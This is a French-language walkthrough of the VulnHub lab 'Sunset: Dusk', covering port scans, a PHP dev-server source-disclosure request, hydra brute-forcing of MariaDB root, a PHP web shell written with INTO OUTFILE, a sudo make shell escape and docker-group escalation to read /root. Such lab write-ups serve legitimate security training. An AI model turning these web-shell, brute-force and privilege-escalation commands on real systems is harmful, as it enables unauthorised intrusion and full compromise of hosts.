---
title: "Solution du CTF Sunset: Dusk de VulnHub"
tags: [CTF, VulnHub]
---

Je continue avec les CTF signés *whitecr0wz* avec le [Sunset: Dusk](https://vulnhub.com/entry/sunset-dusk,404/).

J'ai fait fausse route sur l'énumération et perdu pas mal de temps, mais c'était tout de même intéressant.

## Fausse root

Il y a pas mal de services à énumérer ici :

```
Nmap scan report for 192.168.56.156
Host is up (0.00027s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     pyftpdlib 1.5.5
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|_      PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
25/tcp   open  smtp    Postfix smtpd
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_WITH_AES_256_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 2048
|             Generator Length: 8
|             Public Key Length: 2048
|     References:
|_      https://www.ietf.org/rfc/rfc2246.txt
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       1337DAY-ID-34882        7.5     https://vulners.com/zdt/1337DAY-ID-34882        *EXPLOIT*
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-0215   6.0     https://vulners.com/cve/CVE-2019-0215
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-36160  5.0     https://vulners.com/cve/CVE-2021-36160
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|       CVE-2023-27522  0.0     https://vulners.com/cve/CVE-2023-27522
|       CVE-2023-25690  0.0     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-37436  0.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
|_http-server-header: Apache/2.4.38 (Debian)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB-0+deb10u1
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.11-1)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
```

Sur le port 80 on trouve une page par défaut pour Apache et une énumération ne remonte absolument rien.

Le port 8080 servi par la ligne de commande (`php -S 127.0.0.1:8080`) peut être intéressant. Il me semblait avoir vu passer une vulnérabilité le concernant à une époque.

`Nuclei` le confirme :

```console
$ nuclei -u http://192.168.56.156:8080/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.8.9

                projectdiscovery.io

[INF] Using Nuclei Engine 2.8.9 (outdated)
[INF] Using Nuclei Templates 9.4.1 (latest)
[INF] Templates added in last update: 69
[INF] Templates loaded for scan: 5768
[INF] Targets loaded for scan: 1
[INF] Templates clustered: 1041 (Reduced 962 Requests)
[php-detect] [http] [info] http://192.168.56.156:8080/ [7.3.11]
[tech-detect:php] [http] [info] http://192.168.56.156:8080/
[INF] Using Interactsh Server: oast.online
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:access-control-max-age] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://192.168.56.156:8080/
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://192.168.56.156:8080/
[waf-detect:apachegeneric] [http] [info] http://192.168.56.156:8080/
[mysql-native-password] [network] [info] 192.168.56.156:3306
[php-src-diclosure] [http] [high] http://192.168.56.156:8080
[smtp-service-detect] [network] [info] 192.168.56.156:25
[esmtp-detect] [network] [info] 192.168.56.156:25
[phpcli-stack-trace] [http] [info] http://192.168.56.156:8080/2NvklQBqd8aTAoovVlJVtaIH4pl.php
[mysql-detect] [network] [info] 192.168.56.156:3306
[openssh-detect] [network] [info] 192.168.56.156:22 [SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1]
```

La vulnérabilité de source disclosure est décrite dans ce document : [PHP Development Server <= 7.4.21 - Remote Source Disclosure](https://blog.projectdiscovery.io/php-http-server-source-disclosure/)

On peut reproduire facilement l'exploit pour voir le code servi sur le port 8080 :

```console
$ echo -e "GET /index.php HTTP/1.1\r\nHost: pd.research\r\n\r\nGET /xyz.xyz HTTP/1.1\r\n\r\n" | ncat 192.168.56.156 8080 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.156:8080.
HTTP/1.1 200 OK
Host: pd.research
Date: Mon, 03 Apr 2023 20:09:42 GMT
Connection: close
Content-Type: chemical/x-xyz
Content-Length: 239

<?php
echo "PHP Gallery <br><br>";

$row = exec('ls',$output,$error);
while(list(,$row) = each($output)){
echo $row, "<BR>";
}
if($error){
echo "Error : $error<BR>";
exit;
}
echo "<br>";

echo "Local working directory:";
echo getcwd();
?>
Ncat: 72 bytes sent, 384 bytes received in 0.08 seconds.
```

Malheureusement aucune entrée utilisateur n'est traitée, le script n'est pas vulnérable.

Faute d'avoir quelque chose à me mettre sous la dent, j'utilise le serveur web pour tenter de découvrir des noms d'utilisateurs :

```console
$ smtp-user-enum -U wordlists/common-names 192.168.56.156 25
Connecting to 192.168.56.156 25 ...
220 dusk.dusk ESMTP Postfix (Debian/GNU)
250 dusk.dusk
Start enumerating users with VRFY mode ...
[----] aaron       550 5.1.1 <aaron>: Recipient address rejected: User unknown in local recipient table
[----] aarti       550 5.1.1 <aarti>: Recipient address rejected: User unknown in local recipient table
[----] abdenace    550 5.1.1 <abdenace>: Recipient address rejected: User unknown in local recipient table
[----] abdol       550 5.1.1 <abdol>: Recipient address rejected: User unknown in local recipient table
[----] abdul       550 5.1.1 <abdul>: Recipient address rejected: User unknown in local recipient table
[----] abdulkaf    550 5.1.1 <abdulkaf>: Recipient address rejected: User unknown in local recipient table
[----] abdullah    550 5.1.1 <abdullah>: Recipient address rejected: User unknown in local recipient table
[----] abdur       550 5.1.1 <abdur>: Recipient address rejected: User unknown in local recipient table
[----] abhijit     550 5.1.1 <abhijit>: Recipient address rejected: User unknown in local recipient table
[----] abhiram     550 5.1.1 <abhiram>: Recipient address rejected: User unknown in local recipient table
[----] abraham     550 5.1.1 <abraham>: Recipient address rejected: User unknown in local recipient table
[----] abrar       550 5.1.1 <abrar>: Recipient address rejected: User unknown in local recipient table
[----] acacia      550 5.1.1 <acacia>: Recipient address rejected: User unknown in local recipient table
--- snip ---
```

Nada. Vu que le serveur se présente comme `dusk` je teste s'il y a un utilisateur du même nom, et c'est le cas :

```console
$ ncat 192.168.56.156 25 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.156:25.
220 dusk.dusk ESMTP Postfix (Debian/GNU)
helo dusk.dusk
250 dusk.dusk
vrfy dusk
252 2.0.0 dusk
```

J'ai tenté alors de bruteforcer le mot de passe mais ça ne m'a mené nul part.

## Maria²

Finalement, c'était le compte `root` du MariaDB qui avait un mot de passe stupide :

```console
$ hydra -l root -P wordlists/rockyou.txt -e nsr mysql://192.168.56.156
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-04 07:46:34
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344384 login tries (l:1/p:14344384), ~3586096 tries per task
[DATA] attacking mysql://192.168.56.156:3306/
[3306][mysql] host: 192.168.56.156   login: root   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-04 07:46:36
```

Je me rencarde sur le système :

```sql
MariaDB [(none)]> show variables  where variable_name like 'version%';
+-------------------------+------------------------------------------+
| Variable_name           | Value                                    |
+-------------------------+------------------------------------------+
| version                 | 10.3.18-MariaDB-0+deb10u1                |
| version_comment         | Debian 10                                |
| version_compile_machine | x86_64                                   |
| version_compile_os      | debian-linux-gnu                         |
| version_malloc_library  | system                                   |
| version_source_revision | 604f80e77c054758aa449064cdc29dfa13a71922 |
| version_ssl_library     | YaSSL 2.4.4                              |
+-------------------------+------------------------------------------+
7 rows in set (0,002 sec)
```

On est `root` et on dispose des privilèges `FILE`. Comme on sait que le port 8080 sert le dossier `/var/tmp/` (il l'indique dans son output), je vais faire un `INTO OUTFILE` dedans.

```sql
MariaDB [(none)]> select '<?php system($_GET[chr(99)]); ?>' into outfile '/var/tmp/backdoor.php';
Query OK, 1 row affected (0,001 sec)

MariaDB [(none)]> select load_file("/var/tmp/backdoor.php");
+------------------------------------+
| load_file("/var/tmp/backdoor.php") |
+------------------------------------+
| <?php system($_GET[chr(99)]); ?>   |
+------------------------------------+
1 row in set (0,001 sec)
```

Ça fonctionne. Un shell plus tard je peux lire le flag dans le dossier de `dusk` :

```
www-data@dusk:/home/dusk$ cat user.txt 
08ebacf8f4e43f05b8b8b372df24235b
```

## Boys on the docks

`www-data` peut lancer plusieurs commandes en tant que `dusk` mais surtout `make`... donc tout ce qu'il souhaite.

```
www-data@dusk:/home/dusk$ sudo -l
Matching Defaults entries for www-data on dusk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dusk:
    (dusk) NOPASSWD: /usr/bin/ping, /usr/bin/make, /usr/bin/sl
```

Je créé un `Makefile` qui lance `bash` :

```console
www-data@dusk:/tmp$ echo -e "all:\n\tbash" > Makefile
www-data@dusk:/tmp$ sudo -u dusk /usr/bin/make
bash
dusk@dusk:/tmp$ id
uid=1000(dusk) gid=1000(dusk) groups=1000(dusk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner),123(docker)
```

L'utilisateur faisant partie du groupe docker, je vais utiliser la méthode d'escalade de privilèges classique déjà décrite dans [KB VULN #2]({% link _posts/2021-12-08-Solution-du-CTF-KB-VULN-2-de-VulnHub.md %}).

D'abord je récupère et exporte une image Alpine sur ma machine.

```console
$ docker pull alpine
Using default tag: latest
latest: Pulling from library/alpine
f56be85fc22e: Pull complete 
Digest: sha256:124c7d2707904eea7431fffe91522a01e5a861a624ee31d03372cc1d138a3126
Status: Downloaded newer image for alpine:latest
docker.io/library/alpine:latest
$ docker images -a | grep alpine
alpine              latest       9ed4aefc74f6   5 days ago      7.04MB
$ docker save --output alpine.tar 9ed4aefc74f6
```

Une fois uploadée sur la VM, je l'importe et je l'utilise pour monter `/root` :

```console
dusk@dusk:~$ docker load --input alpine.tar
f1417ff83b31: Loading layer [==================================================>]  7.338MB/7.338MB
Loaded image ID: sha256:9ed4aefc74f6792b5a804d1d146fe4b4a2299147b0f50eaf2b08435d7b38c27e
dusk@dusk:~$ docker run -it -v /root:/real_root sha256:9ed4aefc74f6792b5a804d1d146fe4b4a2299147b0f50eaf2b08435d7b38c27e
/ # cd real_root/
/real_root # ls
root.txt
/real_root # cat root.txt
Congratulations on successfully completing the challenge! I hope you enjoyed as much as i did while creating such device. 
Send me some feedback at @whitecr0wz! 


                         .'  .-.'__.-----.\
                        /    `-'(__--'
                      .'       `. _ `--._
                     /            .`--'''`
                    /           .'   
                 _.'-.         J    
                /    J         F    
              .'     F        J     
             /      /         /-.    
            /      /         /   \    
           /      /         J    |      
          /      /          /   /   
         /   /  /          J   /    
        /   /  /           /-'/
       /   / -'           /  /    
      J   / /            / .'      
      / -'-'   /        /-'        
     (/|      |        /           
      /.'   ) | _.--  /            
     //     < \/   (  |            
    //       `.\    `.`.           
   //     ___/ \ `-.  `.`. 
   - ----'      )|`.\)  `-))\-')  
                '   )     ')/

Until then!

8930fa079a510ee880fe047d40dc613e
```
